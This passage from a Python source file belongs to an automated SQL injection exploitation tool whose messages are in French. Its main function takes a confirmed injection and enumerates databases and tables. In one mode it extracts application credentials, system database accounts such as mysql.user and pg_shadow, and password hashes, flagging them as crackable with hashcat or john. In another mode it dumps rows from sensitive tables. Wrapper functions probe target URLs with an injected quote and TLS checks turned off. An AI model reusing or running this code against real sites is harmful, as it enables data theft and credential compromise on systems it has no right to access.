            "techniques_tried": ["error-based (EXTRACTVALUE/UPDATEXML)", "UNION SELECT", "Boolean blind", "Time-based (SLEEP)"],
        }
        return results

    # Store meta for successful injection too
    results["_scan_meta"] = {
        "params_tested":   getattr(inj, "_tested_params",  []),
        "headers_tested":  getattr(inj, "_tested_headers", []),
        "contexts_tested": len(SQLInjector.CONTEXTS),
        "suffixes_tested": len(SQLInjector.SUFFIXES),
        "vectors_total":   len(getattr(inj, "_tested_params", [])) * len(SQLInjector.CONTEXTS) * len(SQLInjector.SUFFIXES),
    }

    results["injectable"]     = True
    results["db_type"]        = inj.db_type
    # Expose injection context for the frontend "how it worked" display
    results["inj_param"]      = inj.inj_param
    results["inj_header"]     = inj.inj_header
    results["inj_method"]     = inj.inj_method
    results["inj_ctx"]        = inj.inj_ctx
    results["inj_suffix"]     = inj.inj_suffix
    results["inj_is_header"]  = inj.inj_is_header
    results["vis_col"]        = inj.vis_col
    results["num_cols"]       = inj.num_cols
    results["_err_fn"]        = getattr(inj, "_err_fn", "EXTRACTVALUE")
    results["vulnerabilities"].append({
        "type": "sql_injection", "severity": "critical",
        "name": f"SQL Injection ({inj.inj_method}) — param: '{inj.inj_param or inj.inj_header}'",
        "detail": f"ctx={inj.inj_ctx} suf={inj.inj_suffix} vecteur={'header' if inj.inj_is_header else 'param'}",
        "param": inj.inj_param or inj.inj_header,
    })

    # Step 2: Detect technique
    tech = inj.setup_technique()
    if not tech:
        cb("warn", "🗄️ Injection détectée mais extraction impossible")
        return results

    results["technique"] = tech

    # Step 3: Check stacked queries
    inj.detect_stacked_queries()

    # Step 4: Extract DB info
    results["info"] = inj.extract_info()
    # Flatten for easy access in app.py
    results["version"]      = results["info"].get("version", "")
    results["current_user"] = results["info"].get("user", "")
    results["current_db"]   = results["info"].get("current_db", "")

    if mode == "basic":
        return results

    # Step 5: Enumerate
    results["databases"] = inj.extract_databases()
    results["tables"]    = inj.extract_tables()

    if mode == "enum":
        return results

    # Step 6: Smart credential dump (creds mode)
    if mode == "creds":
        results["credentials"] = inj.extract_credentials()
        cred_summary = results["credentials"].get("_creds_summary", [])
        sys_creds    = results["credentials"].get("_sys_creds", [])
        hashes       = results["credentials"].get("_hashes", [])

        if cred_summary:
            tables_hit = sorted(set(c.get("table","?") for c in cred_summary))
            results["vulnerabilities"].append({
                "type":     "credential_exposure",
                "severity": "critical",
                "name":     f"Credentials exposés: {len(cred_summary)} compte(s)",
                "detail":   f"Tables: {', '.join(tables_hit)}",
            })
        if sys_creds:
            results["vulnerabilities"].append({
                "type":     "system_credential_exposure",
                "severity": "critical",
                "name":     f"Comptes système DB exposés: {len(sys_creds)}",
                "detail":   "mysql.user / pg_shadow / sys.sql_logins — accès root DB",
            })
        if hashes:
            hash_types = sorted(set(h.get("type","?") for h in hashes if h.get("type")))
            if hash_types:
                results["vulnerabilities"].append({
                    "type":     "password_hash_exposure",
                    "severity": "high",
                    "name":     f"{len(hashes)} hash(s) de mot de passe extraits",
                    "detail":   f"Types: {', '.join(hash_types)} — crackable avec hashcat/john",
                })
        return results

    # Step 7: Full dump (dump mode)
    to_dump = [target_table] if target_table else []
    if not to_dump:
        for t in results["tables"]:
            if t.lower() in SENSITIVE_TABLES:
                to_dump.append(t)
        if not to_dump:
            to_dump = results["tables"][:5]

    for t in to_dump[:6]:
        cols = inj.extract_columns(t)
        results["columns"][t] = cols
        if cols:
            rows = inj.dump_table(t, cols, limit=30)
            results["dump"][t] = rows
            if rows:
                cb("vuln", f"🚨 '{t}': {len(rows)} ligne(s)!")

    return results


# ─── Legacy compatibility wrappers ────────────────────────────────────────────

def detect_db_type(url, param=None, callback=None):
    if not HAS_REQUESTS:
        return "MySQL"
    try:
        import requests as _r
        parsed = urllib.parse.urlparse(url if "://" in url else "http://" + url)
        qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        p = param or (list(qs.keys())[0] if qs else "id")
        qs[p] = (qs.get(p, "1")) + "'"
        r = _r.get(url.split("?")[0], params=qs, timeout=8, verify=False,
                   headers={"User-Agent": UA})
        return _detect_db_from_error(r.text)
    except Exception:
        return "MySQL"


def get_databases(url, param, db_type=None, num_columns=2, callback=None):
    r = full_db_extraction(url, param=param, mode="enum", callback=callback)
    return r.get("databases", [])


def get_tables(url, param, database=None, db_type=None, num_columns=2, callback=None):
    r = full_db_extraction(url, param=param, mode="enum", callback=callback)
    return r.get("tables", [])


def get_columns(url, param, table, database=None, db_type=None, num_columns=2, callback=None):
    r = full_db_extraction(url, param=param, mode="dump",
                           target_table=table, callback=callback)
    return r.get("columns", {}).get(table, [])


def dump_table(url, param, table, columns, limit=20, database=None,
               db_type=None, num_columns=2, callback=None):
    r = full_db_extraction(url, param=param, mode="dump",
                           target_table=table, callback=callback)
    return r.get("dump", {}).get(table, [])


def test_sql_injection(url, param=None, method="GET", callback=None):
    return full_db_extraction(url, param=param, method=method,
                              mode="basic", callback=callback)
